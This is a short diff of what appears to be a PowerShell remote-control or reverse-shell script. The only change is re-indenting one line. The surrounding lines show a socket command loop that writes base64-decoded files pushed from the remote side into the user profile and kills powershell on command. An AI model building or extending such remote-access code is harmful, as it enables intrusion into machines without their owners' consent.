@@ -33,7 +33,7 @@ while($true){
 				$socket.close()
 				stop-process -Force -name powershell
 			}elseif($out_split[0].equals("rec-file") -and $out_split.length -eq 2){
-                $bytes = [Convert]::FromBase64String($out_split[1])
+				$bytes = [Convert]::FromBase64String($out_split[1])
 				[IO.File]::WriteAllBytes("$ENV:UserProfile\received.out", $bytes)
 			}
 		} While (!$out.equals("exit"))
